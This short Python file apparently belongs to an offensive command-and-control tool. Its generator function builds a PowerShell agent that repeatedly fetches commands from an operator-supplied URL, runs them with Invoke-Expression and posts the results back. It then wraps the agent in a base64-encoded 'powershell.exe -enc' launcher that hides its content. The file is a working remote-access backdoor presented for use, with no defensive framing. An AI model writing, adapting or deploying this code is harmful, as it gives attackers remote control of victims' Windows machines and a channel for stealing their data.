from base64 import b64encode

def generate(url, sleep):
    payload = """
    $ProgressPreference = 'SilentlyContinue'
    $sleep = %SLEEP%
    $post = ''
    while ($true)
    {
        Start-Sleep -Seconds $sleep
        $cmd = Invoke-WebRequest '%URL%'
        if ($cmd.Content -eq 'exit-agent') { break }
        if ($cmd.Content -like '*set-sleep*') { $sleep = $cmd.Content.replace("set-sleep ", ""); continue }
        if ($cmd.Content -eq '') { continue }

        $result = Invoke-Expression $cmd
        
        if ($result -is [string]) { $post = $result }
        elseif ($result -is [array])
        {
            foreach ($line in $result)
            {
                $post += $line.ToString() + "%NL%"
            }
        }

        Invoke-RestMethod -Uri %URL% -Method POST -Body $post -ContentType 'text/plain; charset=utf-8'
        $post = ''
    }
    """
    payload = payload.replace("%SLEEP%", str(sleep))
    payload = payload.replace("%URL%", url)
    encoded = b64encode(payload.encode('UTF-16LE'))
    return "powershell.exe -enc " + str(encoded).replace("b'", "").replace("'", "")
